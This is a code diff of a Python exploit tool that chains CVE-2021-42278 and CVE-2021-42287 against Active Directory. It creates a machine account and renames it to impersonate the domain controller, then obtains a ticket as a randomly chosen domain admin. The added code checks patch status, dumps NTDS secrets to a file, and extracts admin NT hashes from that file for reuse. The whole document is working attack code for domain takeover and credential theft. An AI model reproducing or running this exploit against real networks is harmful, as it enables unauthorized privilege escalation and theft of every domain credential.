@@ -20,6 +20,7 @@ from binascii import unhexlify
 import ldapdomaindump
 import ldap3
 import time
+import re
 
 from utils.helper import *
 from utils.addcomputer import AddComputerSAMR
@@ -29,20 +30,7 @@ from utils.secretsdump import DumpSecrets
 
 characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
 
-def banner():
-    return """
-███    ██  ██████  ██████   █████   ██████ 
-████   ██ ██    ██ ██   ██ ██   ██ ██      
-██ ██  ██ ██    ██ ██████  ███████ ██      
-██  ██ ██ ██    ██ ██      ██   ██ ██      
-██   ████  ██████  ██      ██   ██  ██████ 
-                                           
-                                        
-    """
-
 def exploit(dcfull,adminticket,options):
-    logging.info("Pls make sure your choice hostname and the -dc-ip are same machine !!")
-    # export KRB5CCNAME
     os.environ["KRB5CCNAME"] = adminticket
     if options.shell:
         try:
@@ -58,9 +46,9 @@ def exploit(dcfull,adminticket,options):
         try:
             options.k = True
             options.target_ip = options.dc_ip
-            options.system = options.bootkey = options.security = options.system = options.ntds = options.sam = options.resumefile = options.outputfile = None
-            dumper = DumpSecrets(dcfull, '', '',
-                            domain, options)
+            options.system = options.bootkey = options.security = options.system = options.ntds = options.sam = options.resumefile = None
+            options.outputfile = 'secrets.txt'
+            dumper = DumpSecrets(dcfull, '', '', domain, options)
             dumper.dump()
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -68,142 +56,196 @@ def exploit(dcfull,adminticket,options):
                 traceback.print_exc()
             logging.error(str(e))
 
-def samtheadmin(username, password, domain, options):
-    if options.new_name:
-        new_computer_name = options.new_name
+
+def get_hash_from_secrets(username):
+    with open('secrets.txt.ntds') as f:
+        lines = f.readlines()
+    
+    for line in lines:
+        admin_acc = re.search(r"(?:\S+)\\(\S+):(?:\d+):(?:[0-9a-f]{32}):([0-9a-f]{32}):::", line)
+        if admin_acc:
+            username = admin_acc.group(1)
+            hash = admin_acc.group(2)
+            return username, hash
+        
+
+def getTGT(username, options, kdc, requestPAC=True):
+    userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    if options.hashes is not None:
+        __lmhash, __nthash = options.hashes.split(':')
     else:
-        new_computer_name = ''.join(random.sample(string.ascii_letters + string.digits, 10)).upper()
-    new_computer_password = ''.join(random.choice(characters) for _ in range(12))
+        __lmhash = __nthash = ''
+    aesKey = ''
+    if options.aesKey is not None:
+        aesKey = options.aesKey
+    try:
+        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain,
+                                                                unhexlify(__lmhash), unhexlify(__nthash), aesKey,
+                                                                kdc, requestPAC=requestPAC)
+        return tgt
+    except Exception as e:
+        logging.error(f"Error getting TGT, {e}")
+        return None
 
-    domain, username, password, lmhash, nthash = parse_identity(options)
+
+def check_patch(username, options, kdc):
+    # Patched DCs respond with PACs regardless, compare requests to check if DC is patched
+    pac_tgt = getTGT(username, options, kdc, requestPAC=True)
+    no_pac_tgt = getTGT(username, options, kdc, requestPAC=False)
+    if pac_tgt and no_pac_tgt:
+        print(f'[+] TGT with PAC: {len(pac_tgt)}')
+        print(f'[+] TGT without PAC: {len(no_pac_tgt)}')
+        if len(pac_tgt) == len(no_pac_tgt):
+            print(f'[-] TGTs are same size, target {options.dc_ip} is patched')
+            exit()
+        else:
+            print(f'[+] TGTs differ in size, target is not patched')
+            return True
+    else:
+        print(f'[-] Failed requesting both TGTs to check patch status')
+        exit()
+
+
+def check_machine_account_quota(username, password, domain, lmhash, nthash, options):
     ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
-
     cnf = ldapdomaindump.domainDumpConfig()
     cnf.basepath = None
     domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
     MachineAccountQuota = 10
-    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
-    if dn:
-        logging.error(f'Account {new_computer_name} already exists!')
-        return  
     for i in domain_dumper.getDomainPolicy():
         MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))
 
     if MachineAccountQuota < 0:
-        logging.error(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
+        print(f'[-] Cannot exploit. ms-DS-MachineAccountQuota: {MachineAccountQuota}')
         exit()
     else:
-        logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')
-
-    if options.dc_host:
-        dc_host = options.dc_host.upper()
-        dcfull = f'{dc_host}.{domain}'
-        dn = get_user_info(dc_host+"$", ldap_session, domain_dumper)
-        if not dn:
-            logging.error(f'Machine not found in LDAP: {dc_host}')
-            return
-    else:
-        dcinfo = get_dc_host(ldap_session, domain_dumper,options)
-        if len(dcinfo)== 0:
-            logging.error("Cannot get domain info")
-            exit()
-        c_key = 0
-        dcs = list(dcinfo.keys())
-        if len(dcs) > 1:
-            logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
-            cnt = 0
-            for name in dcs:
-                logging.info(f"{cnt}: {name}")
-                cnt += 1
-            while True:
-                try:
-                    c_key = int(input(">>> Your choice: "))
-                    if c_key in range(len(dcs)):
-                        break
-                except Exception:
-                    pass
-        dc_host = dcs[c_key].lower()
-        dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()
-    logging.info(f'Selected Target {dcfull}')
-    if options.impersonate:
-        domain_admin = options.impersonate
-    else:
-        domainAdmins = get_domain_admins(ldap_session, domain_dumper)
-        logging.info(f'Total Domain Admins {len(domainAdmins)}')
-        domain_admin = random.choice(domainAdmins)
-    
-    logging.info(f'will try to impersonat {domain_admin}')
-    adminticket = str(f'{domain_admin}_{dcfull}.ccache')
-    if os.path.exists(adminticket):
-        logging.info(f'Alreay have user {domain_admin} ticket for target {dcfull}')
-        exploit(dcfull,adminticket,options)
-        return
+        print(f'[+] ms-DS-MachineAccountQuota: {MachineAccountQuota}')
+        return domain_dumper
 
 
-    logging.info(f'Adding Computer Account "{new_computer_name}"')
-    logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')
+def check(username, password, domain, options):
+    domain, username, password, lmhash, nthash = parse_identity(options)
 
-    # Creating Machine Account
+    # Check if DC is patched
+    check_patch(username, options, options.dc_ip)
+
+    # Check machine account quota
+    domain_dumper = check_machine_account_quota(username, password, domain, lmhash, nthash, options)
+
+    return domain_dumper
+
+
+def get_dc_hostname(ldap_session, domain_dumper, options):
+    dcinfo = get_dc_host(ldap_session, domain_dumper, options)
+    if len(dcinfo) == 0:
+        print('[-] Failed retrieving domain info from LDAP')
+        exit()
+
+    c_key = 0
+    dcs = list(dcinfo.keys())
+    if len(dcs) > 1:
+        logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
+        cnt = 0
+        for name in dcs:
+            logging.info(f"{cnt}: {name}")
+            cnt += 1
+        while True:
+            try:
+                c_key = int(input(">>> Your choice: "))
+                if c_key in range(len(dcs)):
+                    break
+            except Exception:
+                pass
+    dc_host = dcs[c_key].lower()
+    dc_fqdn = dcinfo[dcs[c_key]]['dNSHostName'].lower()
+    return dc_host, dc_fqdn
+
+
+def create_temp_account(username, password, domain, options, delete=False):
+    # Generate temp computer name and password
+    new_computer_name = ''.join(random.sample(string.ascii_letters + string.digits, 10)).upper()
+    new_computer_password = ''.join(random.choice(characters) for _ in range(12))
+
+    # Create Machine Account
     addmachineaccount = AddComputerSAMR(
-        username, 
-        password, 
-        domain, 
+        username,
+        password,
+        domain,
         options,
         computer_name=new_computer_name,
         computer_pass=new_computer_password)
-    addmachineaccount.run()
+    addmachineaccount.run(delete=delete)
+
+    print(f'[+] Successfully added temporary account: {new_computer_name}:{new_computer_password}')
+    return new_computer_name, new_computer_password
 
 
-    # CVE-2021-42278
-    new_machine_dn = None
-    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
-    if dn:
-        new_machine_dn = str(dn['dn'])
-        logging.info(f'{new_computer_name} object = {new_machine_dn}')
+def modify_temp_account(old_name, new_name, ldap_session, domain_dumper):
+    dn = get_user_info(old_name, ldap_session, domain_dumper)
+    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_name]]})
+    if ldap_session.result['result'] == 0:
+        print(f'[+] Successfully modified sAMAccountName for {old_name} to {new_name}')
+    else:
+        print(f'[-] Failed to modify the machine account: {ldap_session.result["message"]}')
+        exit()
 
-    if new_machine_dn:
-        ldap_session.modify(new_machine_dn, {'sAMAccountName': [ldap3.MODIFY_REPLACE, [dc_host]]})
-        if ldap_session.result['result'] == 0:
-            logging.info(f'{new_computer_name} sAMAccountName == {dc_host}')
-        else:
-            logging.error('Cannot rename the machine account , target patched')
-            del_added_computer(ldap_session, domain_dumper,new_computer_name)
-            exit()
 
+def samtheadmin(username, password, domain, options):
+    domain, username, password, lmhash, nthash = parse_identity(options)
+    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
+
+    # Check if all conditions are met to be exploitable
+    domain_dumper = check(username, password, domain, options)
+
+    # Retrieve DC FQDN
+    dc_host, dcfull = get_dc_hostname(ldap_session, domain_dumper, options)
+    print(f'[+] Target is vulnerable! {options.dc_ip} -> {dcfull}')
+
+    # Select an admin to impersonate
+    domain_admins = get_domain_admins(ldap_session, domain_dumper)
+    domain_admin = random.choice(domain_admins)
+    adminticket = str(f'{domain_admin}_{dcfull}.ccache')
+    print(f'[+] Impersonating {domain_admin}')
+
+    # Create the computer account
+    new_computer_name, new_computer_password = create_temp_account(username, password, domain, options)
+
+    # Modify the computer account altName
+    modify_temp_account(new_computer_name, dc_host, ldap_session, domain_dumper)
+   
     # make hash none, we don't need id now.
     options.hashes = None
     
-    # Getting a ticke
+    # Getting a ticket
     getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
     getting_tgt.run()
     dcticket = str(dc_host + '.ccache')
 
-    # Restoring Old Values
-    logging.info(f"Resting the machine account to {new_computer_name}")
-    dn = get_user_info(dc_host, ldap_session, domain_dumper)
-    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
-    if ldap_session.result['result'] == 0:
-        logging.info(f'Restored {new_computer_name} sAMAccountName to original value')
-    else:
-        logging.error('Cannot restore the old name lol')
-
+    # Revert the changes to the computer account
+    modify_temp_account(dc_host, new_computer_name, ldap_session, domain_dumper)
+   
     os.environ["KRB5CCNAME"] = dcticket
-    executer = GETST(None, None, domain, options,
-        impersonate_target=domain_admin,
-        target_spn=f"cifs/{dcfull}")
+    executer = GETST(None, None, domain, options, impersonate_target=domain_admin, target_spn=f"cifs/{dcfull}")
     executer.run()
-    logging.info(f'Remove ccache of {dcfull}')
+    print(f'[+] Removing ccache of {dcfull}')
     os.remove(dcticket)
-    logging.info(f'Rename ccache with target.')
-    os.rename(f'{domain_admin}.ccache',adminticket)
-    # Delete domain computer we just added.
-    del_added_computer(ldap_session, domain_dumper,new_computer_name)
-    exploit(dcfull,adminticket,options)
+    print(f'[+] Renaming ccache with target')
+    os.rename(f'{domain_admin}.ccache', adminticket)
+
+    # Dump NTDS
+    exploit(dcfull, adminticket, options)
+
+    # Delete computer account
+    password = None
+    username, nthash = get_hash_from_secrets(domain_admin)
+    options.k = None
+    options.hashes = 'aad3b435b51404eeaad3b435b51404ee:' + nthash
+    lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
+    del_added_computer(ldap_session, domain_dumper, new_computer_name)
 
 
 if __name__ == '__main__':
-    print(banner())
-
     parser = argparse.ArgumentParser(add_help = True, description = "SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain")
 
     parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
